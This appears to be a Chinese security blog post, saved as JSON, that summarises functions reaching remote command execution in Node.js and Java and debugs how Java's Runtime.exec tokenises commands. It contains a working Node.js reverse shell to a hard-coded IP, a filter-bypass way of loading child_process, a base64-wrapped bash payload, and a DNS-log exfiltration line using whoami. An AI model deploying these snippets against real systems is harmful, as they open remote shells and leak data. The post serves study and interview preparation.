{"title":"RCE函数总结","slug":"rce_conclude","date":"2021-02-27T10:10:29.000Z","updated":"2021-02-27T14:38:20.186Z","comments":true,"path":"api/articles/rce_conclude.json","photos":[],"link":"","excerpt":"最近由于面试，被面试官提到了无法回答的关于命令执行的问题，遂写此文总结各语言RCE时所碰到的函数和相关的知识点，查漏补缺，也方便自己以后使用到的时候可以快速使用。（后续可能根据积累持续更新）","covers":["../static/images/image-20210227220806587.png","../static/images/image-20210227220918133.png","../static/images/image-20210227221506116.png","../static/images/image-20210227221649311.png","../static/images/image-20210227222240281.png"],"content":"<p>最近由于面试，被面试官提到了无法回答的关于命令执行的问题，遂写此文总结各语言RCE时所碰到的函数和相关的知识点，查漏补缺，也方便自己以后使用到的时候可以快速使用。（后续可能根据积累持续更新）</p>\n<span id=\"more\"></span>\n<h2 id=\"nodejs\"><a class=\"markdownIt-Anchor\" href=\"#nodejs\"></a> NodeJs</h2>\n<p>nodejs的几个可用命令执行函数：</p>\n<p>child_process.spawn</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var net &#x3D; require(&quot;net&quot;),</span><br><span class=\"line\">cp &#x3D; require(&quot;child_process&quot;),</span><br><span class=\"line\">sh &#x3D; cp.spawn(&quot;&#x2F;bin&#x2F;sh&quot;, []);</span><br><span class=\"line\">var client &#x3D; new net.Socket();</span><br><span class=\"line\">client.connect(8080, &quot;192.168.1.1&quot;, function()&#123;</span><br><span class=\"line\">client.pipe(sh.stdin);</span><br><span class=\"line\">sh.stdout.pipe(client);</span><br><span class=\"line\">sh.stderr.pipe(client);</span><br></pre></td></tr></table></figure>\n<p>child_process.exec</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var exec &#x3D; require(&#39;child_process&#39;).exec; </span><br><span class=\"line\">var cmdStr &#x3D; &#39;curl http:&#x2F;&#x2F;www.weather.com.cn&#x2F;data&#x2F;sk&#x2F;101010100.html&#39;;</span><br><span class=\"line\">exec(cmdStr, function(err,stdout,stderr)&#123;</span><br><span class=\"line\">      console.log(stdout);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>child_process.execSync</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var result &#x3D; require(&#39;child_process&#39;).execSync(&#39;ls&#39;).toString();</span><br></pre></td></tr></table></figure>\n<p>child_process.execFile</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var callfile &#x3D; require(&#39;child_process&#39;); </span><br><span class=\"line\">var ip &#x3D; &#39;1.1.1.1&#39;;</span><br><span class=\"line\">var username &#x3D; &#39;test&#39;;</span><br><span class=\"line\">var password &#x3D; &#39;pwd&#39;;</span><br><span class=\"line\">var newpassword &#x3D; &#39;newpwd&#39;;</span><br><span class=\"line\"></span><br><span class=\"line\">callfile.execFile(&#39;change_password.sh&#39;,[&#39;-H&#39;, ip, &#39;-U&#39;, username, &#39;-P&#39;, password, &#39;-N&#39;, newpassword],null,function (err, stdout, stderr) &#123;</span><br><span class=\"line\">    callback(err, stdout, stderr);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>命令注入可能碰到的场景是这样的，比如程序员再拼接字符串的时候使用了eval函数：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;select id from user where user&#x3D;&quot; + querystring); &#x2F;&#x2F; 此处querystring可控</span><br></pre></td></tr></table></figure>\n<p>调用命令执行函数的时候需要引入child_process模块，有以下两种方式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">require(&#39;child_porcess&#39;).execSync(&#39;id&#39;);</span><br><span class=\"line\">global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;id&#39;);</span><br></pre></td></tr></table></figure>\n<h2 id=\"java\"><a class=\"markdownIt-Anchor\" href=\"#java\"></a> Java</h2>\n<p>常见的两种方式如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ProcessBuilder pb&#x3D;new ProcessBuilder(cmd); </span><br><span class=\"line\">pb.start();</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Runtime.getRuntime().exec(cmd)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>下面主要讨论一下Java在命令执行中为何不能使用|,&lt;,&gt;等特殊符号，首先以Runtime.getRuntime().exec(cmd)为例来看一下java进行命令执行的机制，调试如下代码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import java.io.*;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Main &#123;</span><br><span class=\"line\">    public static void main(String[] arg) throws IOException &#123;</span><br><span class=\"line\">        String command&#x3D;&quot;&#x2F;bin&#x2F;bash -c &#123;echo,ZWNobyAxMjMgPiAxMjMudHh0Cg&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;;</span><br><span class=\"line\">        Process proc &#x3D; Runtime.getRuntime().exec(command);   &#x2F;&#x2F;在此行加断点，进入exec函数</span><br><span class=\"line\">        InputStream in &#x3D; proc.getInputStream();</span><br><span class=\"line\">        BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(in, &quot;UTF8&quot;));</span><br><span class=\"line\">        String line &#x3D; null;</span><br><span class=\"line\">        while((line&#x3D;br.readLine())!&#x3D;null) &#123;</span><br><span class=\"line\">            System.out.println(line);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"../static/images/image-20210227220806587.png\" alt=\"image-20210227220806587\" /></p>\n<p>继续进入exec函数，运行至return this.exec(cmdarray, envp, dir)这行：</p>\n<p><img src=\"../static/images/image-20210227220918133.png\" alt=\"image-20210227220918133\" /></p>\n<p>可见，经过stringTokenizer处理后，我们输入的command变成了一个数组，通过空格分割：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[&quot;&#x2F;bin&#x2F;bash&quot;, &quot;-c&quot;, &quot;&#123;echo,ZWNobyAxMjMgPiAxMjMudHh0Cg&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;]</span><br></pre></td></tr></table></figure>\n<p>这个函数是单纯通过分隔符来切割的，也就是说，假如我们输入的command是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;bin&#x2F;bash -c &quot;echo &#96;whoami&#96;&quot;</span><br></pre></td></tr></table></figure>\n<p>其会被分割为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[&quot;&#x2F;bin&#x2F;bash&quot;, &quot;-c&quot;, &quot;\\&quot;echo&quot;, &quot;&#96;whoami&#96;\\&quot;&quot;]</span><br></pre></td></tr></table></figure>\n<p>然而，我们预期的参数其实是：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[&quot;&#x2F;bin&#x2F;bash&quot;, &quot;-c&quot;, &quot;\\&quot;echo &#96;whoami&#96;\\&quot;&quot;]</span><br></pre></td></tr></table></figure>\n<p>这里是简单提一下为什么尽量不要使用空格的原因。我们继续跟，会发现Runtime.getRuntime().exec底层其实用了ProcessBuilder（因此分析了Runtime.getRuntime也就不用再分析ProcessBuilder了）：</p>\n<p><img src=\"../static/images/image-20210227221506116.png\" alt=\"image-20210227221506116\" /></p>\n<p>跟入start函数，一直到SecurityManager security = System.getSecurityManager();这里：</p>\n<p><img src=\"../static/images/image-20210227221649311.png\" alt=\"image-20210227221649311\" /></p>\n<p>这个地方只是简单检查了一下arg[0]，即/bin/bash是否具有执行权限，继续跟，一直到ProcessImpl.start，然后跟start函数，一直跟到</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Process p &#x3D; new ProcessImpl(toCString(cmdarray[0]), argBlock, args.length, envBlock, envc[0], toCString(dir), std_fds, forceNullOutputStream, redirectErrorStream);</span><br></pre></td></tr></table></figure>\n<p>然后进入ProcessImpl：</p>\n<p><img src=\"../static/images/image-20210227222240281.png\" alt=\"image-20210227222240281\" /></p>\n<p>实际上，java底层实现系统命令的机制是创建一个子进程，然后把后面的内容都当做是这个程序的参数，因此，java的命令执行机制是不能同时执行两个命令的，例如，我们想执行下面的代码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;bin&#x2F;echo &#96;whoami&#96; &gt; 123              &#x2F;&#x2F; 这里java解析后会运行echo，然后把&#96;whoami&#96; &gt; 123都视为是echo的参数，感兴趣的可以自己运行验证一下</span><br><span class=\"line\">&#x2F;bin&#x2F;ping &#96;whoami&#96;.dnslog.com         &#x2F;&#x2F; 同上，而且&#96;whoami&#96;不会像脚本语言那里解析并执行一下</span><br><span class=\"line\">&#x2F;bin&#x2F;ls | base64 -                    &#x2F;&#x2F; 在脚本语言中|是一个管道符号，而在这里java会把|和base64和-当做是ls的三个参数</span><br></pre></td></tr></table></figure>\n<p>这些在脚本语言中的逻辑，在java的命令执行逻辑中是无法实现的。</p>\n","categories":[],"tags":[{"name":"web","slug":"web","count":3,"path":"api/tags/web.json"}]}